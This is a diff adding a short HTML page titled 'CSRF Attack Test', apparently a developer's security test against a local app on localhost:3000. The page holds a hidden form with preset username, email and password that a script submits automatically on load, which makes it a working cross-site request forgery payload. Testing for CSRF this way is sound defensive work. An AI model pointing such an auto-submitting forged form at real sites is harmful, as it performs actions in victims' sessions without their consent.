@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>CSRF Attack Test</h1>
+
+<form action="http://localhost:3000/users" method="POST">
+  <input type="hidden" name="username" value="csrf_injected_user">
+  <input type="hidden" name="email" value="csrf@example.com">
+  <input type="hidden" name="password" value="123456">
+  <input type="submit" value="Submit CSRF">
+</form>
+
+<script>
+  document.forms[0].submit();
+</script>
+
+</body>
+</html>
